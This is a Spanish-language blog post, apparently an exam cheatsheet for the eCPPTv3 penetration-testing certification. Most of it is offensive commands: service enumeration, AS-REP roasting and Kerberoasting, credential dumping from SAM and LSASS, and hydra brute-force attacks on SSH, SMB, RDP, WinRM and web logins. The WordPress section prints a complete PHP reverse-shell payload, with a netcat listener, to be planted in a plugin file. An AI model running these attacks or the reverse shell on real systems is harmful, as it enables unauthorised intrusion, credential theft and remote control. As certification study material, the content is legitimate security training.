---
id: "ine-ecpptv3-cheatsheet"
title: "eCPPTv3 Cheatsheet"
author: "mario-ramos-salson"
publishedDate: YYYY-MM-DD
updatedDate: YYYY-MM-DD
image: ""
description: "eLearnSecurity eCPPTv3 cheatsheet"
categories:
  - "certificaciones"
draft: false
featured: false
lang: "es"
---

Eyyyy, ¿qué tal? Supongo que habéis llegado a esta cheatsheet desde mi review del eCPPTv3. Y, si no es así, id a echarle un vistazo ;)

El propósito de esta cheatsheet es ayudar en caso de que alguien se quede atascado en algún puerto o servicio y pueda venir aquí a consultar nuevos comandos que quizá no sabía que existían, y así ayudar tanto a aprobar el examen como a aprender cosas o técnicas nuevas.

La forma en la que está estructurada esta cheatsheet es la siguiente:

- [Enumeración de puertos / servicios](#enumeración-de-puertos--servicios)
- [Enumeración de usuarios del dominio](#enumeración-de-usuarios-del-dominio)
- [Ataque AS-REP Roast](#ataque-as-rep-roast)
- [Ataque Kerberoasting](#ataque-kerberoasting)
- [Hash Dump](#hash-dump)
- [Gestores de contenidos](#gestores-de-contenidos)

Como podéis ver, no es una cheatsheet entera de cualquier cosa, sino que está un poco enfocada a este examen en específico.

De hecho, se ve claramente que la mayoría de cosas tienen que ver con AD, ya que es casi el 80 % del examen. Por eso hago mucho énfasis en obtención de usuarios, ataques al AD como Kerberoasting o AS-REP Roasting, o dumpeo de hashes para elevación de privilegios o movimiento lateral.

Espero que os sirva y que os salve de un apuro, o que os ayude a aprender algo nuevo :)

Y, si pensáis que falta algo o queréis hacer alguna aportación, no dudéis en contactarme. ¡Un abrazoo!

## Enumeración de puertos / servicios

### SMB - PUERTO 445

**NMAP**

```bash
nmap -p445 --script=smb-vuln-* 10.10.10.10

nmap -p 445 --script smb-protocols 10.10.10.10
nmap -p 445 --script smb-security-mode 10.10.10.10

nmap -p 445 --script smb-os-discovery 10.10.10.10

nmap -p 445 --script smb-enum-sessions 10.10.10.10
nmap -p 445 --script smb-enum-sessions --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-shares 10.10.10.10
nmap -p 445 --script smb-enum-shares --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-users --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-groups--script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-domains--script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-server-stats --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-services --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=USER,smbpassword=PASS 10.10.10.10
```

**SMBMap**

```bash
smbmap -H 10.10.10.10

smbmap -u guest -H 10.10.10.10

smbmap -u NOEXIST -H 10.10.10.10

smbmap -u USER -p "PASS" -H 10.10.10.10

smbmap -u USER -p "PASS" -H 10.10.10.10 -x 'id'
```

**SMBCLIENT**

```bash
smbclient -L 10.10.10.10 -N
smbclient -L 10.10.10.10 -U USER
smbclient //10.10.10.10/SHARE -U USER
```

**enum4linux**

```bash
enum4linux -o 10.10.10.10
enum4linux -U 10.10.10.10
enum4linux -S 10.10.10.10
enum4linux -G 10.10.10.10
enum4linux -i 10.10.10.10
enum4linux -r -u USER -p "PASS" 10.10.10.10
enum4linux -a -u USER -p "PASS" 10.10.10.10
enum4linux -U -M -S -P -G 10.10.10.10
```

Flags:
- -o: obtiene información del sistema operativo remoto.
- -U: enumera usuarios.
- -S: enumera recursos compartidos (shares).
- -G: enumera grupos.
- -i: enumera impresoras.
- -r: obtiene información mediante enumeración RID cycling.
- -u: usuario para autenticación.
- -p: contraseña para autenticación.
- -a: ejecuta una enumeración amplia (equivale a "all").
- -M: enumera información de máquinas del dominio/workgroup.
- -P: obtiene información de políticas de contraseña.

### WinRM - PUERTO 5985/5986

```bash
evil-winrm -i 10.10.10.10 -u 'USER' -p 'PASSWORD'
```

### FTP - PUERTO 21

**NMAP**

```bash
nmap -p21 --script=ftp-anon 10.10.10.10
nmap -p21 --script=ftp-bounce 10.10.10.10
nmap -p21 --script=ftp-syst 10.10.10.10
nmap -p21 --script=ftp-vsftpd-backdoor 10.10.10.10
nmap -p21 --script=ftp-* 10.10.10.10
```

**Cliente FTP**

```bash
ftp 10.10.10.10

# Usuario anónimo
ftp anonymous@10.10.10.10
```

### SSH - PUERTO 22

**NMAP**

```bash
nmap -p22 --script=ssh-auth-methods 10.10.10.10
nmap -p22 --script=ssh-hostkey 10.10.10.10
nmap -p22 --script=ssh-publickey-acceptance 10.10.10.10
nmap -p22 --script=sshv1 10.10.10.10
```

**SSH**

```bash
ssh user@10.10.10.10

# Con clave privada
ssh -i id_rsa user@10.10.10.10

# Especificar algoritmo de cifrado
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@10.10.10.10
```

### DNS - PUERTO 53

**DIG**

```bash
dig @10.10.10.10 domain.local

# Transferencia de zona
dig @10.10.10.10 domain.local AXFR

# Consulta inversa
dig @10.10.10.10 -x 10.10.10.10
```

**NSLOOKUP**

```bash
nslookup domain.local 10.10.10.10

# Transferencia de zona
nslookup
> server 10.10.10.10
> set type=any
> ls -d domain.local
```

**DNSRecon**

```bash
dnsrecon -d domain.local -n 10.10.10.10

# Transferencia de zona
dnsrecon -d domain.local -n 10.10.10.10 -t axfr

# Fuerza bruta de subdominios
dnsrecon -d domain.local -n 10.10.10.10 -D /usr/share/wordlists/subdomains.txt -t brt
```

### HTTP/HTTPS - PUERTO 80/443

**NMAP**

```bash
nmap -p80,443 --script=http-enum 10.10.10.10
nmap -p80,443 --script=http-headers 10.10.10.10
nmap -p80,443 --script=http-methods 10.10.10.10
nmap -p80,443 --script=http-webdav-scan 10.10.10.10
nmap -p80,443 --script=http-shellshock 10.10.10.10
nmap -p80,443 --script=http-title 10.10.10.10
```

**Whatweb**

```bash
whatweb http://10.10.10.10
whatweb https://10.10.10.10 -v
```

**Nikto**

```bash
nikto -h http://10.10.10.10
nikto -h https://10.10.10.10 -ssl
```

**Gobuster**

```bash
# Enumeración de directorios
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# Enumeración de subdominios
gobuster vhost -u http://domain.local -w /usr/share/wordlists/subdomains.txt

# Con extensiones
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
```

**Feroxbuster**

```bash
feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# Con extensiones y recursivo
feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -r
```

**FFUF**

```bash
# Enumeración de directorios
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Enumeración de subdominios
ffuf -u http://FUZZ.domain.local -w /usr/share/wordlists/subdomains.txt -H "Host: FUZZ.domain.local"

# Fuzzing de parámetros GET
ffuf -u http://10.10.10.10/page?FUZZ=value -w /usr/share/wordlists/parameters.txt
```

### RPC - PUERTO 135

**RPCClient**

```bash
rpcclient -U "" -N 10.10.10.10

rpcclient -U "USER%PASSWORD" 10.10.10.10

# Comandos útiles dentro de rpcclient:
# enumdomusers - enumerar usuarios del dominio
# enumdomgroups - enumerar grupos del dominio
# queryuser <RID> - información de un usuario específico
# querygroupmem <RID> - miembros de un grupo
```

**NMAP**

```bash
nmap -p135 --script=msrpc-enum 10.10.10.10
```

### LDAP - PUERTO 389/636

**NMAP**

```bash
nmap -p389 --script=ldap-rootdse 10.10.10.10
nmap -p389 --script=ldap-search 10.10.10.10
nmap -p389,636 --script=ldap-brute 10.10.10.10
```

### MSSQL - PUERTO 1433

**NMAP**

```bash
nmap -p1433 --script=ms-sql-info 10.10.10.10
nmap -p1433 --script=ms-sql-brute 10.10.10.10
nmap -p1433 --script=ms-sql-ntlm-info 10.10.10.10
nmap -p1433 --script=ms-sql-empty-password 10.10.10.10
nmap -p1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password 10.10.10.10
```

**Impacket-mssqlclient**

```bash
impacket-mssqlclient USER:PASSWORD@10.10.10.10

# Con autenticación de Windows
impacket-mssqlclient domain.local/USER:PASSWORD@10.10.10.10 -windows-auth

# Comandos útiles dentro de mssqlclient:
# enable_xp_cmdshell
# xp_cmdshell whoami
```

### MySQL - PUERTO 3306

**NMAP**

```bash
nmap -p3306 --script=mysql-info 10.10.10.10
nmap -p3306 --script=mysql-brute 10.10.10.10
nmap -p3306 --script=mysql-empty-password 10.10.10.10
nmap -p3306 --script=mysql-enum 10.10.10.10
nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass=password 10.10.10.10
```

**Cliente MySQL**

```bash
mysql -h 10.10.10.10 -u root -p

mysql -h 10.10.10.10 -u root -ppassword

# Comandos útiles dentro de MySQL:
# show databases;
# use database_name;
# show tables;
# select * from users;
```

### RDP - PUERTO 3389

**NMAP**

```bash
nmap -p3389 --script=rdp-enum-encryption 10.10.10.10
nmap -p3389 --script=rdp-ntlm-info 10.10.10.10
nmap -p3389 --script=rdp-vuln-ms12-020 10.10.10.10
```

**xfreerdp**

```bash
xfreerdp /u:USER /p:PASSWORD /v:10.10.10.10

xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:10.10.10.10

# Con hash NTLM
xfreerdp /u:USER /pth:NTHASH /v:10.10.10.10
```

**rdesktop**

```bash
rdesktop -u USER -p PASSWORD 10.10.10.10

rdesktop -d DOMAIN -u USER -p PASSWORD 10.10.10.10
```

### PostgreSQL - PUERTO 5432

**NMAP**

```bash
nmap -p5432 --script=pgsql-brute 10.10.10.10
```

**psql**

```bash
psql -h 10.10.10.10 -U postgres -d postgres

# Comandos útiles dentro de psql:
# \l - listar bases de datos
# \c database_name - conectar a una base de datos
# \dt - listar tablas
# SELECT * FROM users;
```

---

## Enumeración de usuarios del dominio

### SMB - PUERTO 445

```bash
nxc smb 10.10.10.10 -u "" -p "" --users      # Enumeración de usuarios
nxc smb 10.10.10.10 -u "" -p "" --rid-brute  # Enumeración de usuarios

nxc smb 10.10.10.10 -u "guest" -p "" --users      # Enumeración de usuarios con guest
nxc smb 10.10.10.10 -u "guest" -p "" --rid-brute  # Enumeración de usuarios con guest

nxc smb 10.10.10.10 -u "USER" -p "PASS" --users      # Enumeración de usuarios con credenciales
nxc smb 10.10.10.10 -u "USER" -p "PASS" --rid-brute  # Enumeración de usuarios con credenciales
```

### LDAP - PUERTO 389/636

```bash
# ldapsearch: enumeración de usuarios sin credenciales
ldapsearch -x -H 'ldap://10.10.10.10' -b "DC=domain,DC=local" "(objectClass=user)" userPrincipalName

# ldapsearch: enumeración de usuarios con credenciales
ldapsearch -x -H ldap://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=DOMAIN,DC=LOCAL" "(objectClass=user)" userPrincipalName

# ldapsearch: enumeración de grupos con credenciales
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=group)" cn member

# LDAPS (636)
ldapsearch -x -H ldaps://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=domain,DC=local"

# netexec ldap: enumeración de usuarios con credenciales
nxc ldap 10.10.10.10 -u 'USER' -p 'PASSWORD' --query "(objectClass=user)" "userPrincipalName"

```

### RPC - PUERTO 135

```bash
rpcclient -U "USER%PASSWORD" 10.10.10.102  -c "enumdomusers"
```

### Kerberos -  PUERTO 88

```bash
# Enumerar usuarios mediante fuerza bruta
kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt
```

## Ataque AS-REP Roast

```bash
nxc ldap DC_IP -u domain_users.txt -p '' --asreproast asrep_hashes.txt

impacket-GetNPUsers -no-pass -usersfile domain_users.txt -dc-ip DC_IP -request -format hashcat -outputfile asrep_hashes.txt local.htb/
```

Y después crackeamos los hashes:

```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

## Ataque Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip DC_IP -outputfile kerberoast_hashes.txt "domain.local/USER:PASSWORD"

nxc ldap DC_IP -u "USER" -p "PASSWORD" --kerberoasting kerberoast_hashes.txt
```

Y después crackeamos los hashes:

```bash
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

## Hash Dump

### Impacket-SecretsDump

```bash
impacket-secretsdump 'domain.local/USER:PASSWORD'@10.10.10.10

Con hash NTLM

impacket-secretsdump 'domain.local/USER'@10.10.10.10 -hashes :NTHASH

# Con ticket Kerberos
KRB5CCNAME=krb5cc impacket-secretsdump -k 'DOMINIO/user@IP_OBJETIVO'
```

### Netexec

```bash
# SAM Dump
nxc smb 10.10.10.10 -u USER -p 'PASSWORD' -d domain.local --sam
nxc smb 10.10.10.10 -u USER -H 'PASSWORD' --local-auth --sam

# LSASS Dump
nxc smb 10.10.10.10 -d DOMINIO -u USER -p 'PASSWORD' --lsa
nxc smb 10.10.10.10 -d DOMINIO -u USER -H 'NTHASH' --lsa
```

## Gestores de contenidos

### WordPress

Entre los archivos más interesantes que podemos encontrar en un WordPress están:

- ``/wp-admin/login.php``
- ``/wp-admin/wp-login.php``
- ``/login.php``
- ``/wp-login.php``

**wpscan**

```bash
wpscan --url "https://10.10.10.10" -e t  # Temas instalados
wpscan --url "https://10.10.10.10" -e vt # Temas vulnerables instalados

wpscan --url "https://10.10.10.10"  -e p  # Plugins instalados
wpscan --url "https://10.10.10.10"  -e vp # Plugins vulnerables instalados

wpscan --url "https://10.10.10.10"  -e u       # Usuarios de WordPress
wpscan --url 10.10.10.10 --usernames users.txt # Usuarios de WordPress

wpscan --url "https://10.10.10.10" --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 10
```

En el caso de que seamos capaces de acceder al panel de administración de WordPress, obtener una consola interactiva en la víctima es súper sencillo.

1. Nos vamos a plugins y le damos a Plugin File Editor.
2. Buscamos algún archivo `.php` que queramos editar.

Por sencillez, podemos usar el archivo principal del plugin, que siempre se llama igual: `PLUGIN.php`.

Una vez que entramos en ese archivo, vamos al final del todo y ponemos el siguiente bloque de código:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';   // CAMBIAR
$port = 4444;        // CAMBIAR
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  
  if ($pid) {
    exit(0);
  }

  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }

  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}


chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}


$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w") 
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }


  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }


  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);


  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }


  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }


  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);


function printit ($string) {
  if (!$daemon) {
    print "$string\n";
  }
}
```

Pero, antes de guardar este payload en el plugin, nos tenemos que poner en escucha para recibir la reverse shell.

```bash
nc -lvnp 4444
```

Ahora sí, podemos darle a guardar y veremos cómo obtenemos shell en la víctima.

Una vez que la conseguimos, podemos aplicar un tratamiento de la TTY para manejarnos mejor por el sistema.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo;fg
reset xterm
export SHELL=/bin/bash
export TERM=xterm-256color
source /etc/skel/.bashrc
```

## Fuerza bruta

### SSH - PUERTO 22

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V
```

### FTP - PUERTO 21

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

hydra -l anonymous -P passwords.txt ftp://10.10.10.10
```

### SMB - PUERTO 445

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10

hydra -L users.txt -P passwords.txt smb://10.10.10.10 -t 1 -V
```

### RDP - PUERTO 3389

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -V
```

### WinRM - PUERTO 5985/5986

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt winrm://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt winrm://10.10.10.10

hydra -L users.txt -P passwords.txt winrm://10.10.10.10 -t 4 -V
```

### HTTP/HTTPS - PUERTO 80/443

```bash
# Formulario HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# Formulario HTTP GET
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# Autenticación básica HTTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get /admin

# HTTPS con POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-post-form "/login:username=^USER^&password=^PASS^:F=Login failed" -V
```

**Flags útiles de Hydra:**
- `-l USER`: especifica un único usuario.
- `-L users.txt`: especifica un archivo con múltiples usuarios.
- `-p PASS`: especifica una única contraseña.
- `-P passwords.txt`: especifica un archivo con múltiples contraseñas.
- `-t N`: número de tareas/hilos paralelos (por defecto: 16).
- `-V` o `-vV`: modo verbose para ver cada intento.
- `-f`: detener cuando se encuentra una credencial válida.
- `-s PORT`: especifica un puerto personalizado si no es el estándar

